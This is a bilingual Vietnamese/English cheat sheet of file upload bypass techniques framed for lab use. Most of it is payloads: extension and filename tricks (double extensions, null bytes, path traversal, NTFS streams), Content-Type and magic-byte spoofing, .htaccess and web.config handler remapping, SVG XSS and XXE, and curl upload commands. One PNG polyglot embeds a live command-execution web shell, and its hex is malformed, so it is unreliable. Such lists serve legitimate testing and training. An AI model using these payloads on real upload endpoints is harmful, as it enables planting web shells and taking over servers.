# 13. File Upload Bypass

> [!CAUTION]
> Chỉ dùng trong lab local hoặc hệ thống có ủy quyền rõ ràng. Payload có risk `destructive`, `dos` hoặc `oob` phải chạy trong fixture cô lập, có giới hạn tài nguyên và không có outbound network.

> **Phạm vi kiểm chứng:** Nội dung và payload vẫn ở mức technical review. `static-verified` chỉ xác nhận annotation và kiểm tra tĩnh trong đúng context/version đã ghi; không phải lab evidence và không cho phép sử dụng ngoài phạm vi được ủy quyền.

File Upload Bypass xảy ra khi chức năng tải tệp tin lên máy chủ không kiểm tra kỹ lưỡng định dạng tệp, nội dung tệp hoặc quyền thực thi, cho phép kẻ tấn công tải lên mã độc (Web Shell) và thực thi mã nguồn.

### 13.1. File Extension & Name Manipulation Bypass
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Khi gửi yêu cầu tải tệp với đuôi `.php` thì bị chặn và trả về thông báo lỗi "File extension not allowed".
    *   *English*: Standard `.php` file uploads return "extension not allowed" exceptions from application validators.

<!-- payload-id: CHEAT-13-001 -->
<!-- context: PHP 8.2 with Apache 2.4 and an isolated IIS 10 comparison fixture; uploads land on a noexec disposable volume; case: 13.1. File Extension & Name Manipulation Bypass -->
<!-- prerequisites: use inert marker content, disable execution on the upload volume, cap file size/count and restore the web-server configuration after each case -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: the upload gate records each filename decision and stores only inert marker bytes; the fixed allowlist renames and keeps every file non-executable -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    # Use curl to upload a file with a double extension
    curl -F "file=@shell.p.phphp" http://victim.lab.test/upload
    # Use curl to upload a file with a mixed-case extension
    curl -F "file=@shell.pHp" http://victim.lab.test/upload
    ```
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Thử thay đổi phần mở rộng tệp tin thành đuôi thay thế, đổi hoa thường hoặc chèn Null Byte.
    *   *English*: Change parameters to alternative extensions, mixed-case strings, or append null bytes.
*   **Payloads (10 Payloads)**:
<!-- payload-id: CHEAT-13-002 -->
<!-- context: PHP 8.2 with Apache 2.4 and an isolated IIS 10 comparison fixture; uploads land on a noexec disposable volume; case: 13.1. File Extension & Name Manipulation Bypass -->
<!-- prerequisites: use inert marker content, disable execution on the upload volume, cap file size/count and restore the web-server configuration after each case -->
<!-- encoding: UTF-8 line-oriented payload list; each non-comment line is an independent case and is encoded only by the documented URL/header/parser layer -->
<!-- expected-result: the upload gate records each filename decision and stores only inert marker bytes; the fixed allowlist renames and keeps every file non-executable -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
    # 1. Alternative PHP Extensions
    shell.php3                                           # Alternative PHP 3 execution handler
    shell.php4                                           # Alternative PHP 4 execution handler
    shell.php5                                           # Alternative PHP 5 execution handler
    shell.phtml                                          # Inline HTML/PHP parse bypass extension
    shell.phar                                           # PHP Archive executable file type extension

    # 2. Case Mutation Bypass
    shell.pHp                                            # Mixed-case extension bypass
    shell.PhP5                                           # Mixed-case PHP5 extension bypass
    shell.Phtml                                          # Mixed-case Phtml extension bypass

    # 3. Null Byte Injection (PHP <= 5.3.x) (⚠️ Version Warning: Null byte injection requires PHP < 5.3.4)
    shell.php%00.jpg                                     # ⚠️ URL encoded null byte truncation bypass (requires PHP < 5.3.4)
    shell.php\\x00.jpg                                    # ⚠️ Hexadecimal representation null byte bypass (requires PHP < 5.3.4)

    # 4. Path Traversal in Filename Parameter
    ../../../shell.php                                  # Directory traversal to escape upload container
    ..%2f..%2f..%2fshell.php                             # URL encoded traversal bypass

    # 5. Windows NTFS Alternate Data Streams (ADS) Bypass
    shell.php::$DATA                                     # Appends Windows alternate data stream structure
    shell.php:.jpg                                       # Creates secondary alternate JPEG stream
    shell.php::$DATA.jpg                                 # Windows ADS extension mapping bypass

    # 6. Double Extension & Regex Bypass (Replace once bypass)
    shell.p.phphp                                        # Resolves to shell.php if 'php' is stripped once
    shell.ph.phpphp                                      # Alternative double strip recursion bypass

    # 7. Trailing spaces/dots bypass
    shell.php. .                                         # Bypasses space trimming algorithms
    shell.php.                                           # Trailing dot Windows directory mapping bypass

    # 8. Semicolon IIS upload bypass
    shell.asp;.jpg                                       # IIS server executes file using first extension segment

    # 9. Reverse proxy double dot bypass
    ..%252f..%252fshell.php                              # Double-URL encoded traversal path

    # 10. Long extension truncation bypass
    shell.php.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.jpg       # Bypasses extension checks using buffer limits
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng Burp Suite Intruder fuzzing danh sách đuôi tệp tin thay thế từ SecLists.
    *   *English*: Run Burp Suite Intruder to fuzz parameter extensions using alternative wordlists.


---

### 13.2. Content-Type & Signature Validation Bypass
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Ứng dụng kiểm tra cấu trúc nội dung tệp (MIME type hoặc Magic Bytes) thay vì chỉ kiểm tra tên tệp.
    *   *English*: Server evaluates file MIME-types or magic byte signatures instead of just the filename.

<!-- payload-id: CHEAT-13-003 -->
<!-- context: PHP 8.2 with Apache 2.4 and an isolated IIS 10 comparison fixture; uploads land on a noexec disposable volume; case: 13.2. Content-Type & Signature Validation Bypass -->
<!-- prerequisites: use inert marker content, disable execution on the upload volume, cap file size/count and restore the web-server configuration after each case -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: spoofed media type/signature does not make the marker executable; the fixed fixture verifies decoded content and stores it outside executable paths -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    # Use curl to upload a file with a spoofed Content-Type header
    curl -F "file=@shell.php;type=image/jpeg" http://victim.lab.test/upload
    ```
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Thay đổi giá trị Header Content-Type hoặc chèn các byte đặc trưng của ảnh (Magic Bytes) vào đầu Web Shell.
    *   *English*: Tamper with Content-Type headers or prepend image file signatures to code strings.
*   **Payloads (10 Payloads)**:
<!-- payload-id: CHEAT-13-004 -->
<!-- context: PHP 8.2 with Apache 2.4 and an isolated IIS 10 comparison fixture; uploads land on a noexec disposable volume; case: 13.2. Content-Type & Signature Validation Bypass -->
<!-- prerequisites: use inert marker content, disable execution on the upload volume, cap file size/count and restore the web-server configuration after each case -->
<!-- encoding: UTF-8 line-oriented payload list; each non-comment line is an independent case and is encoded only by the documented URL/header/parser layer -->
<!-- expected-result: spoofed media type/signature does not make the marker executable; the fixed fixture verifies decoded content and stores it outside executable paths -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
    # 1. Magic Bytes JPEG Signature + PHP code (Raw Hex: FF D8 FF E0)
    \\xff\\xd8\\xff\\xe0<?php echo 'SECHUB_UPLOAD_MARKER'; ?> # JPEG signature plus inert marker

    # 2. Magic Bytes GIF Signature + PHP code (Raw Hex: 47 49 46 38 39 61, ASCII: GIF89a)
    GIF89a;\\n<?php echo 'SECHUB_UPLOAD_MARKER'; ?>       # GIF signature plus inert marker

    # 3. Magic Bytes PNG Signature + PHP code (Raw Hex: 89 50 4E 47 0D 0A 1A 0A)
    \\x89PNG\\r\\n\\x1a\\n<?php echo 'SECHUB_UPLOAD_MARKER'; ?> # PNG signature plus inert marker

    # 4. Magic Bytes PDF Signature + PHP code
    %PDF-1.4\\n<?php echo 'SECHUB_UPLOAD_MARKER'; ?>  # PDF signature plus inert marker

    # 5. Content-Type Header modification (JPEG)
    Content-Type: image/jpeg                             # Spoofs content type to indicate image resource

    # 6. Content-Type Header modification (PNG)
    Content-Type: image/png                              # Spoofs content type to indicate PNG resource

    # 7. Client-side JS validation bypass via request tampering (repeater)
    # Intercept request in proxy and change extension from .jpg to .php

    # 8. Image size validation bypass by copying valid image dimensions into payload
    # Inject command payload into a large, valid image block

    # 9. Metadata EXIF field injection (injecting php shell in EXIF Artist field)
    # exiftool -Artist="SECHUB_UPLOAD_MARKER" marker.jpg

    # 10. Double Content-Type headers injection bypass
    # Content-Type: image/jpeg\\nContent-Type: application/x-php
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Cấu hình Burp Suite Intruder để gửi payload và tự động thay đổi Content-Type tương ứng.
    *   *English*: Configure Burp Suite Intruder payloads to target content type structures.


---

### 13.3. Web Server Configuration & File Execution Hijacking
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Tệp tin tải lên thành công nhưng không thực thi được do thư mục upload tắt quyền chạy script.
    *   *English*: Files are successfully saved, but cannot execute due to write-only permissions on target folders.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Thử tải lên tệp tin cấu hình (`.htaccess`, `web.config`) để cấu hình lại quyền chạy của thư mục, hoặc sử dụng SVG XSS/XXE và Polyglot PNG.
    *   *English*: Attempt loading directory configuration files (`.htaccess`), SVG files, or PNG polyglots.
*   **Payloads (10 Payloads)**:
<!-- payload-id: CHEAT-13-005 -->
<!-- context: PHP 8.2 with Apache 2.4 and an isolated IIS 10 comparison fixture; uploads land on a noexec disposable volume; case: 13.3. Web Server Configuration & File Execution Hijacking -->
<!-- prerequisites: use inert marker content, disable execution on the upload volume, cap file size/count and restore the web-server configuration after each case -->
<!-- encoding: XML bytes are serialized as UTF-8 to match the declaration; entity percent signs and character references are not decoded by an HTTP layer -->
<!-- expected-result: uploaded .htaccess/web.config/polyglot content remains inert on the noexec volume; the fixed server ignores per-upload handler configuration -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```xml
    <!-- 1. .htaccess configuration file upload to map .jpg to PHP handler -->
    # Uploaded filename: .htaccess
    # Content:
    AddType application/x-httpd-php .jpg

    <!-- 2. web.config configuration file upload (IIS) to map .jpg to ASP handler -->
    <!-- Uploaded filename: web.config -->
    <configuration>
      <system.webServer>
        <handlers>
          <add name="jpg-to-asp" path="*.jpg" verb="*" type="System.Web.UI.SimpleHandlerFactory" />
        </handlers>
      </system.webServer>
    </configuration>

    <!-- 3. SVG XSS Payload (triggers JS when viewed in browser) -->
    <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"></svg>

    <!-- 4. SVG XXE Payload (reads system files during parsing) -->
    <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///tmp/sechub-lab/fixture.txt" > ]>
    <svg width="128" height="128" xmlns="http://www.w3.org/2000/svg">
      <text font-size="16" x="0" y="16">&xxe;</text>
    </svg>

    <!-- 5. Polyglot PNG Payload (PHP code hidden in PLTE/IDAT chunks) -->
    <!-- Hex payload including PNG structure hosting active PHP tags -->
    \\x89\\x50\\x4E\\x47\\x0D\\x0A\x1A\\x0A\\x00\\x00\\x00\\x0D\\x49\\x48\\x44\\x52\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x01\\x08\\x03\\x00\\x00\\x00\\xF7\\xE1\\x1A\\x10\\x00\\x00\\x00\\x09\\x50\\x4C\\x54\\x45\\x3C\\x3F\x70\x68\x70\x20\x73\x79\x73\x74\x65\x6D\x28$_GET["cmd"]); ?>\\x00\\x00\\x00\\x0A\\x49\\x44\x41\x54\x78\x9C\x63\x60\x00\x00\x00\x02\x00\x01\\xE2\\x25\\xBC\\xE6\\x00\\x00\\x00\\x00\\x49\\x45\\x4E\\x4D

    <!-- 6. Polyglot GIF payload (GIF89a header + PHP tags) -->
    GIF89a;\\n<?php echo 'SECHUB_UPLOAD_MARKER'; ?>

    <!-- 7. .htaccess script execution protection disable override -->
    # Uploaded filename: .htaccess
    # Content:
    RemoveHandler .php
    AddType application/x-httpd-php .php

    <!-- 8. HTML injection via text file upload -->
    # Uploaded filename: test.txt. Content runs dynamic scripts in browser
    <html><body><script>alert(document.domain)</script></body></html>

    <!-- 9. Shellcode injection in image comments using exiftool -->
    # exiftool -Comment="SECHUB_UPLOAD_MARKER" image.png

    <!-- 10. CGI Script upload bypass -->
    # Uploaded filename: script.cgi. Content maps to perl execution
    #!/usr/bin/perl
    print "Content-type: text/html\\n\\n";
    print "SECHUB_CGI_MARKER";
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng công cụ `exiftool` để tạo tự động các tệp tin ảnh Polyglot chứa mã độc.
    *   *English*: Deploy exiftool commands to compile valid image polyglots hosting scripts.
<!-- payload-id: CHEAT-13-006 -->
<!-- context: PHP 8.2 with Apache 2.4 and an isolated IIS 10 comparison fixture; uploads land on a noexec disposable volume; case: 13.3. Web Server Configuration & File Execution Hijacking -->
<!-- prerequisites: use inert marker content, disable execution on the upload volume, cap file size/count and restore the web-server configuration after each case -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: uploaded .htaccess/web.config/polyglot content remains inert on the noexec volume; the fixed server ignores per-upload handler configuration -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    exiftool -Comment="SECHUB_UPLOAD_MARKER" marker.png
    ```

---

## Tài liệu tham khảo

- **[S1]** OWASP File Upload Cheat Sheet. https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html — bản hiện hành; truy cập: 2026-07-18.
